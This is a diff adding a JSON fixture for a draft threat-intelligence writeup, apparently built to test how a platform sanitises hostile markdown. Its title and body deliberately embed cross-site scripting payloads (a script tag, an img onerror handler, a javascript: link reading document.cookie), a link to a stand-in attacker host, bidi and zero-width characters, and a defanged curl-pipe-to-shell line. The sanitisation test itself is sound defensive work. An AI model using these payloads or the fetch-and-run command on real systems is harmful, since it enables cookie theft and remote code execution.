@@ -1,0 +1,35 @@
+{
+  "tenant_id": "tenant-example",
+  "status": "draft",
+  "tlp": "clear",
+  "embargo_until": null,
+  "technique_ids": [
+    "T1190"
+  ],
+  "campaign_ids": [],
+  "ioc_ids": [],
+  "attempt_ids": [
+    "att_0123456789abcdef01234567"
+  ],
+  "first_seen": 1791936000000,
+  "source_item_id": null,
+  "author_id": "tok_author",
+  "reviewer_id": null,
+  "checklist": null,
+  "version": 1,
+  "created_at": 1792000000000,
+  "updated_at": 1792100000000,
+  "submitted_at": null,
+  "approved_at": null,
+  "published_at": null,
+  "withdrawn_at": null,
+  "writeup_id": "wu_63dc823c91982a4b9e6f3314",
+  "slug": "hostile-markdown",
+  "title": "Hostile <script>alert(1)</script> title",
+  "summary": "We assess as attempts against CVE-2099-0001.",
+  "body_md": "We assess as attempts against CVE-2099-0001. <img src=x onerror=alert(1)>\n\n[click](javascript:alert(document.cookie)) [data](data:text/html,<b>x</b>) [proto](//evil.example.invalid/) [ok](https://nvd.example.invalid/CVE-2099-0001)\n\nBidi: a‮b and zero​width.\n\n```bash\ncurl hxxp://203.0.113.9/x.sh | sh\n```\n",
+  "cve_ids": [
+    "CVE-2099-0001"
+  ],
+  "redacted_payload": null
+}
